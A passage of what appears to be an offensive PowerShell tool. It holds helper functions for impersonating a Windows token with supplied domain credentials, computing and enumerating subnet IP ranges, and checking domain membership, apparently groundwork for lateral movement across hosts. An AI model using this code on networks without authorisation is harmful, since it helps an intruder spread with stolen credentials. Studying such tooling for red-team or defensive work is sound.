	public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
}
"@ -Language CSharp

function Token-Impersonation {
	param (
		[Parameter(Mandatory=$true)]
		[string]$Username,

		[Parameter(Mandatory=$true)]
		[string]$Password,

		[Parameter(Mandatory=$true)]
		[string]$Domain
	)

	process {
		$tokenHandle = [IntPtr]::Zero
		if (-not [Advapi32]::LogonUser($Username, $Domain, $Password, [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS, [LogonProvider]::LOGON32_PROVIDER_DEFAULT, [ref]$tokenHandle)) {
			throw "[-] Failed to obtain user token."
		}

		if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
			[Advapi32]::CloseHandle($tokenHandle)
			throw "[-] Failed to impersonate user."
		}
	}
}

function Revert-Token {process {[Advapi32]::RevertToSelf()}}

function Get-SubnetAddresses {
    Param (
        [IPAddress]$IP,
        [ValidateRange(0, 32)][int]$MaskBits
    )

    $mask = ([Math]::Pow(2, $MaskBits) - 1) * [Math]::Pow(2, (32 - $MaskBits))
    $maskbytes = [BitConverter]::GetBytes([UInt32] $mask)
    $DottedMask = [IPAddress]((3..0 | ForEach-Object { [String] $maskbytes[$_] }) -join '.')

    $lower = [IPAddress] ( $ip.Address -band $DottedMask.Address )

    $LowerBytes = [BitConverter]::GetBytes([UInt32] $lower.Address)
    [IPAddress]$upper = (0..3 | % { $LowerBytes[$_] + ($maskbytes[(3 - $_)] -bxor 255) }) -join '.'

    $ips = @($lower, $upper)
    return $ips
}

function Get-IPRange {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.IPAddress]$Lower,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.IPAddress]$Upper
    )

    $IPList = [Collections.ArrayList]::new()
    $null = $IPList.Add($Lower)
    $i = $Lower
    while ( $i -ne $Upper ) { 
        $iBytes = [BitConverter]::GetBytes([UInt32] $i.Address)
        [Array]::Reverse($iBytes)
        $nextBytes = [BitConverter]::GetBytes([UInt32]([bitconverter]::ToUInt32($iBytes, 0) + 1))
        [Array]::Reverse($nextBytes)
        $i = [IPAddress]$nextBytes
        $null = $IPList.Add($i)
    }
    return $IPList.IPAddressToString
}

function Test-DomainJoinStatus {

	try {
		return (Get-WmiObject Win32_ComputerSystem).PartOfDomain
	}
	catch {
		try {
			$domainName = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
			return ($domainName -and ($domainName -ne $env:COMPUTERNAME))
		}
		catch {
			return $false
		}
	}
}

